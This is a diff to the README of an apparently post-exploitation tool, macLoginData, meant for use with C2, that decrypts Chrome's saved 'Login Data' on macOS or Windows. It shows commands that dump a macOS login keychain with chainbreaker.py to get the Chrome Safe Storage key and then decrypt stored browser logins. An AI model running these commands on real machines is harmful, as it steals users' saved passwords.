@@ -20,14 +20,14 @@ This tool is intended to be used with C2.
 ```sh
 # extract Chrome Safe Storage value
 ➜  ~ ./chainbreaker.py --dump-all login.keychain-db --password=<login-keychain password>
-➜  ~ macLoginData Chrome ~/Library/Application\ Support/Google/Chrome/Default/Login\ Data <Chrome Safe Storage>
+➜  ~ macLoginData Chrome 'Login Data' <Chrome Safe Storage>
 ```
 
 #### Option
 It is also possible to decrypt Login Data retrieved from Windows.
 In that case, use <a href="https://github.com/crypt0p3g/bof-collection/tree/main/ChromiumKeyDump">ChromiumKeyDump</a> to retrieve a masterkey.<br>
 ```sh
-➜  ~ macLoginData -win Chrome Cookies <masterkey>
+➜  ~ macLoginData -win Chrome 'Login Data' <masterkey>
 ```
 
 ## References
